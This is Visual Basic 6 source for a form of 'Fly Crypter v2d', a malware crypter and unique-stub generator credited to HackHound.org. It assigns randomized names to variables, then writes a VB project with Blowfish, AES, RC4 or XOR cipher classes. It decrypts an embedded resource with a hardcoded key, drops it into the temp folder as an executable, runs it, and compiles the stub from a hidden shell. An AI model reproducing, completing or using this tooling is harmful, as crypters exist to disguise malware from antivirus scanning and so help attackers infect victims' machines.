c39.Text = lk 'KeyLength
c40.Text = lk 'data1
c41.Text = lk 'data2
c42.Text = lk 'x1
c43.Text = lk 'x2
c44.Text = lk 'xx
c45.Text = lk 'rest
c46.Text = lk 'value
c47.Text = lk 'a

Sleep 1000

c48.Text = lk 'LongValue
c49.Text = lk 'CryptBuffer
c50.Text = lk 'Offset
c51.Text = lk 'bb
c52.Text = lk 'data1
c53.Text = lk 'data2
c54.Text = lk 'x1
c55.Text = lk 'x2
c56.Text = lk 'xx
c57.Text = lk 'rest
c58.Text = lk 'value

Sleep 1000

c59.Text = lk 'a
c60.Text = lk 'LongValue
c61.Text = lk 'CryptBuffer
c62.Text = lk 'Offset
c63.Text = lk 'Xl
c64.Text = lk 'XR
c65.Text = lk 'i
c66.Text = lk 'j
c67.Text = lk 'k
c68.Text = lk 'x
c69.Text = lk 'xb

Sleep 1000

c70.Text = lk 'Offset
c71.Text = lk 'OrigLen
c72.Text = lk 'LeftWord
c73.Text = lk 'RightWord
c74.Text = lk 'CipherLen
c75.Text = lk 'CipherLeft
c76.Text = lk 'CipherRight
c77.Text = lk 'CurrPercent
c78.Text = lk 'NextPercent
c79.Text = lk 'ErrorHandler
c80.Text = lk ' ..
c81.Text = lk ' none

Sleep 500

c83.Text = lk 'pl
c84.Text = lk 'piz


a1.Text = lk 'DoNotCall
a2.Text = lk 'sLib
a3.Text = lk 'sMod
a4.Text = lk 'Params
a5.Text = lk 'lPtr
a6.Text = lk 'bvASM
a7.Text = RandomLetter 'i
a8.Text = lk 'lMod
a9.Text = lk 'lVTE
a10.Text = lk 'lret

Sleep 1000


If Option4.Value = True Then

xr.Text = lk 'Progress
xr1.Text = lk 'pr..
xr2.Text = lk 'Key
xr3.Text = lk 'new_key
xr4.Text = lk 'DecryptByte
xr5.Text = lk 'ByteArray
xr6.Text = lk 'Key
xr7.Text = lk 'EncryptByte
xr8.Text = lk 'Text
xr9.Text = lk 'Key
xr10.Text = lk  'ByteArray
xr11.Text = lk 'm_Key

Sleep 1000

xr12.Text = lk 'm_KeyLen
xr13.Text = lk 'm_KeyValue
xr14.Text = lk 'ByteArray
xr15.Text = lk 'Key
xr16.Text = lk 'Offset
xr17.Text = lk 'ByteLen
xr18.Text = lk 'ResultLen
xr19.Text = lk 'CurrPercent
xr20.Text = lk 'NextPercent
Sleep 1000
End If


a11.Text = lk
a13.Text = lRan(Text1.Text)
a14.Text = lRan(Text1.Text)
a16.Text = lRan(Text1.Text)
a18.Text = lRan(Text1.Text)
a20.Text = lRan(Text1.Text)

Sleep 500

a22.Text = lRan(Text1.Text)
a24.Text = lRan(Text1.Text)
a26.Text = lRan(Text1.Text)


Sleep 1000

f.a28.Text = lRan(Text1.Text)
f.a30.Text = lRan(Text1.Text)
f.a32.Text = lRan(Text1.Text)

f.a34.Text = lk


f.a36.Text = lRan(Text1.Text)
f.a38.Text = lRan(Text1.Text)
f.a40.Text = lRan(Text1.Text)
f.a42.Text = lRan(Text1.Text)
f.a44.Text = lRan(Text1.Text)

Sleep 400

f.a46.Text = lRan(Text1.Text)
f.a48.Text = lRan(Text1.Text)
f.a50.Text = lRan(Text1.Text)
f.a52.Text = lRan(Text1.Text)
f.a54.Text = lRan(Text1.Text)
f.a56.Text = lRan(Text1.Text)
f.a58.Text = lRan(Text1.Text)

Sleep 500
f.a60.Text = lRan(Text1.Text)
f.a62.Text = lRan(Text1.Text)
f.a64.Text = lRan(Text1.Text)
f.a66.Text = lRan(Text1.Text)
f.a68.Text = lRan(Text1.Text)
f.a70.Text = lRan(Text1.Text)

Sleep 500

f.a72.Text = lRan(Text1.Text)
f.a74.Text = lRan(Text1.Text)
f.a76.Text = lRan(Text1.Text)
f.a78.Text = lRan(Text1.Text)
f.a80.Text = lRan(Text1.Text)
f.a82.Text = lRan(Text1.Text)

Sleep 500
f.a84.Text = lRan(Text1.Text)
f.a86.Text = lRan(Text1.Text)
f.a88.Text = lRan(Text1.Text)
f.a90.Text = lRan(Text1.Text)

Sleep 500

f.f.Text = lk 'codekey
f.f1.Text = lk 'datain
f.f2.Text = lk ' lonDataPtr
f.f3.Text = lk 'strDataOut
f.f4.Text = lk 'intXOrValue1
f.f5.Text = lk 'intXOrValue2

If Check6.Value = 1 Then
f.j.Text = lk
f.j1.Text = lk
f.j2.Text = lk
f.j3.Text = lk
f.j4.Text = lk
f.j5.Text = lk


Sleep 1000

f.j20.Text = lk
f.j21.Text = lk
f.j6.Text = lk
f.j7.Text = lk
f.j8.Text = lk
f.j9.Text = lk
f.j10.Text = lk
f.j11.Text = lk
Sleep 1000
End If

Call sh
Call zh
Call op



a.Text = lk 'api clas
c.Text = lk 'c class
p.Text = lk 'proj

Sleep 1000

Dim lll As String
lll = App.Path

Open lll & "\" & p.Text & ".vbp" For Binary As #1
Put #1, , lproj
Close #1
  
Open lll & "\" & m.Text & ".bas" For Binary As #1
Put #1, , lmain
Close #1

If Option3.Value = True Then
Open lll & "\" & c.Text & ".cls" For Binary As #1
Put #1, , lblowfish
Close #1
End If

If Option9.Value = True Then
Open lll & "\" & c.Text & ".cls" For Binary As #1
Put #1, , lAES
Close #1
End If

If Option5.Value = True Then
Open lll & "\" & c.Text & ".cls" For Binary As #1
Put #1, , lrc4
Close #1
End If


If Option4.Value = True Then
Open lll & "\" & c.Text & ".cls" For Binary As #1
Put #1, , lXOR
Close #1
End If

Open lll & "\" & a.Text & ".cls" For Binary As #1
Put #1, , lApi
Close #1

Sleep 1000

Command1.Enabled = True
Command2.Enabled = True
Check6.Enabled = True
MsgBox "Fly Crypter v2d -Uniq Stub Generator 0.3 Coded by BUNNN" & vbNewLine & "(c) HackHound.org And Sharp-Soft.nEt Labs", vbInformation, "Fly Crypter"
End Sub
Private Sub Command2_Click()
Dim mybitch As String
X = """"
Buffer = LoadResData(1, "RCDATA")
ifile = FreeFile

Call blowfish.DecryptByte(Buffer(), "3C1BacvCQYxrSi37KOPCz5YIKQgf9I")
Open Environ("tmp") & "\VB6_SFX.exe" For Binary As #ifile
Put #ifile, , Buffer()
Close #ifile

Sleep 1000

ShellExecute 0, "open", Environ("tmp") & "\VB6_SFX.exe", 0, Environ("tmp"), 0
Sleep 1000
Shell "cmd /c " & Environ("tmp") & "\Vb6.exe /m " & X & App.Path & "\" & p.Text & ".vbp" & X, vbHide

Sleep 2000

MsgBox "Done !" & vbNewLine & "Stub Path: " & App.Path & l.Text & ".exe" & vbNewLine & vbNewLine & "(c) HackHound.org And Sharp-Soft.nEt Labs", vbInformation, "Fly Crypter v2d"
End Sub
Private Sub Command3_Click()
l1.Text = lt
End Sub
Private Sub Command4_Click()
l2.Text = lt
End Sub
Private Sub Command5_Click()
Text1.Text = rn
End Sub
Private Sub Form_Load()
l1.Text = lt
l2.Text = lt
Text1.Text = rn
Option6.Value = 1
Option1.Value = 1
Option3.Value = 1
Command2.Enabled = False
End Sub
Public Function LoadFile(sPath As String) As String
Dim lFileSize As Long
Dim sData As String
On Error Resume Next
Open sPath For Binary Access Read As #1
lFileSize = LOF(1)
sData = Input$(lFileSize, 1)
Close #1
LoadFile = sData
End Function
Private Sub Form_Unload(Cancel As Integer)
Unload f
Unload n
Unload Me
End Sub
Private Sub op()
jiji:
f.lb.Text = lk
If f.lb.Text = f.gp.Text Or f.lb.Text = f.gp1.Text Then
GoTo jiji
End If
End Sub
Private Sub zh()
kp:
f.gp.Text = lk
f.gp1.Text = lk
If f.gp.Text = f.gp1.Text Then
GoTo kp
End If
End Sub
Private Sub sh()
pl:
f.rtl.Text = lk
f.rtl1.Text = lk
f.rtl2.Text = lk

If f.rtl.Text = f.rtl1.Text Or f.rtl.Text = f.rtl2.Text Or f.rtl1.Text = f.rtl.Text Or f.rtl1.Text = f.rtl2.Text Or f.rtl2.Text = f.rtl.Text Or f.rtl2.Text = f.rtl1.Text Then
GoTo pl
End If
End Sub
Public Function RotxEncrypt(ByVal sData As String) As String
  Dim i       As Long
  For i = 1 To Len(sData)
  RotxEncrypt = RotxEncrypt & Chr$(Asc(Mid$(sData, i, 1)) - f.r3.Text)
  Next i
End Function

Private Sub Label8_Click()
MsgBox "Project Name: Automatically Uniq Stub Generator" & vbNewLine & "Developer: BUNNN" & vbNewLine & "Developed for: HackHound.org Coding Contest", vbInformation, "AUSG"
End Sub
